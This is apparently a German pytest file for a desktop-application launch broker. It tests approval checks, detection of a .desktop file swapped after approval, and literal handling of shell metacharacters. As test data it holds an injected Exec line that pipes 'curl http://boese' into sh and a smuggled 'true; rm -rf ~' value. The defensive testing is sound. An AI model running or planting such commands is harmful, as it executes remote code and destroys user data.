"""T-4.10 — freigegeben wird eine Anwendung, keine Kommandozeile.

Der Austausch der `.desktop`-Datei zwischen Freigabe und Start wird ECHT
gefahren: die Datei wird ueberschrieben, nachdem der Broker sie kennt.
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest

from daimon.brokers.exec import broker as ex


def desktop(verzeichnis: Path, name: str, *, exec_zeile: str = "/usr/bin/true",
            dbus: bool = False) -> Path:
    verzeichnis.mkdir(parents=True, exist_ok=True)
    p = verzeichnis / name
    p.write_text(
        "[Desktop Entry]\nType=Application\n"
        f"Name={name}\nExec={exec_zeile}\n"
        f"DBusActivatable={'true' if dbus else 'false'}\n", encoding="utf-8")
    return p


class LaufStub:
    def __init__(self, rc: int = 0) -> None:
        self.aufrufe: list[list[str]] = []
        self.rc = rc

    def __call__(self, argv, **_kw):
        self.aufrufe.append(list(argv))

        class E:
            returncode = self.rc
            stdout = ""
            stderr = "" if self.rc == 0 else "start fehlgeschlagen"
        return E()


def broker(tmp_path: Path, ids=("gut.desktop",), **kw):
    for kennung in ids:
        desktop(tmp_path / "apps", kennung, **kw)
    pfade = (tmp_path / "apps",)
    katalog = {k: {"status": "approved", "desktop_id": k, "rationale": "x"}
               for k in ids}
    stub = LaufStub()
    b = ex.ExecBroker.aus_katalog(katalog, lauf=stub, suchpfade=pfade)
    return b, stub, pfade


def test_eine_freigegebene_anwendung_startet(tmp_path, monkeypatch):
    b, stub, pfade = broker(tmp_path)
    monkeypatch.setattr(ex, "SUCHPFADE", pfade)
    e = b.starten("gut.desktop")
    assert e["ok"], e
    assert e["weg"] == "systemd-run"
    argv = stub.aufrufe[0]
    assert argv[:3] == ["systemd-run", "--user", "--collect"]


def test_eine_nicht_freigegebene_desktop_id_wird_abgewiesen(tmp_path, monkeypatch):
    b, stub, pfade = broker(tmp_path)
    desktop(tmp_path / "apps", "boese.desktop")
    monkeypatch.setattr(ex, "SUCHPFADE", pfade)
    e = b.starten("boese.desktop")
    assert not e["ok"] and e["grund"] == "nicht_freigegeben"
    assert stub.aufrufe == []


def test_der_austausch_zwischen_freigabe_und_start_verhindert_den_start(
        tmp_path, monkeypatch):
    """Der Kern: `~/.local/share/applications` ist schreibbar."""
    b, stub, pfade = broker(tmp_path)
    monkeypatch.setattr(ex, "SUCHPFADE", pfade)
    # Der Angreifer schreibt eine andere Exec-Zeile hinein.
    desktop(tmp_path / "apps", "gut.desktop",
            exec_zeile="sh -c 'curl http://boese | sh'")
    e = b.starten("gut.desktop")
    assert not e["ok"] and e["grund"] == "datei_getauscht"
    assert stub.aufrufe == []


def test_shell_metazeichen_bleiben_ein_literal(tmp_path, monkeypatch):
    """Kein `shell=True` und kein zusammengebauter String.

    Die Exec-Zeile wird gar nicht erst zerlegt -- gestartet wird ueber
    `gio launch` mit dem PFAD der Datei als eigenem Argument.
    """
    b, stub, pfade = broker(tmp_path, exec_zeile="true; rm -rf ~")
    monkeypatch.setattr(ex, "SUCHPFADE", pfade)
    e = b.starten("gut.desktop")
    assert e["ok"]
    argv = stub.aufrufe[0]
    # Der gefaehrliche Text taucht in KEINEM Argument auf.
    assert not any("rm -rf" in a for a in argv)
    assert all(isinstance(a, str) for a in argv)


def test_dbus_aktivierbare_anwendungen_gehen_ueber_den_bus(tmp_path, monkeypatch):
    b, stub, pfade = broker(tmp_path, ids=("org.kde.kcalc.desktop",), dbus=True)
    monkeypatch.setattr(ex, "SUCHPFADE", pfade)
    e = b.starten("org.kde.kcalc.desktop")
    assert e["ok"] and e["weg"] == "dbus"
    argv = stub.aufrufe[0]
    assert "org.freedesktop.Application.Activate" in argv
    assert "org.kde.kcalc" in argv


def test_der_start_haengt_die_anwendung_in_eine_eigene_unit(tmp_path, monkeypatch):
    """`--collect` und eine eigene Unit: der Prozess liegt nicht in unserer
    cgroup und erbt unsere Sandbox nicht."""
    b, stub, pfade = broker(tmp_path)
    monkeypatch.setattr(ex, "SUCHPFADE", pfade)
    b.starten("gut.desktop")
    argv = stub.aufrufe[0]
    assert any(a.startswith("--unit=daimon-app-") for a in argv)
    assert "--collect" in argv


def test_ein_pfad_statt_einer_desktop_id_wird_abgewiesen():
    with pytest.raises(ex.ExecFehler):
        ex.aufloesen("/usr/share/applications/org.kde.kcalc.desktop")
    with pytest.raises(ex.ExecFehler):
        ex.aufloesen("kcalc")


def test_systemweite_dateien_werden_bevorzugt(tmp_path, monkeypatch):
    """Die root-eigene schlaegt die im Home -- sie liegt ausserhalb der
    Reichweite der uid, gegen die wir uns hier gar nicht wehren koennen."""
    system = tmp_path / "system"
    heim = tmp_path / "heim"
    desktop(system, "doppelt.desktop", exec_zeile="/usr/bin/echt")
    desktop(heim, "doppelt.desktop", exec_zeile="/usr/bin/untergeschoben")
    monkeypatch.setattr(ex, "SUCHPFADE", (system, heim))
    a = ex.aufloesen("doppelt.desktop")
    assert a.pfad.parent == system


def test_eine_unbekannte_anwendung_wird_gemeldet(tmp_path, monkeypatch):
    monkeypatch.setattr(ex, "SUCHPFADE", (tmp_path,))
    with pytest.raises(ex.ExecFehler) as f:
        ex.aufloesen("gibtesnicht.desktop")
    assert "Suchpfad" in str(f.value)


def test_der_abdruck_aendert_sich_mit_der_datei(tmp_path, monkeypatch):
    monkeypatch.setattr(ex, "SUCHPFADE", (tmp_path,))
    desktop(tmp_path, "a.desktop", exec_zeile="/usr/bin/true")
    erst = ex.aufloesen("a.desktop").abdruck
    desktop(tmp_path, "a.desktop", exec_zeile="/usr/bin/false")
    assert ex.aufloesen("a.desktop").abdruck != erst
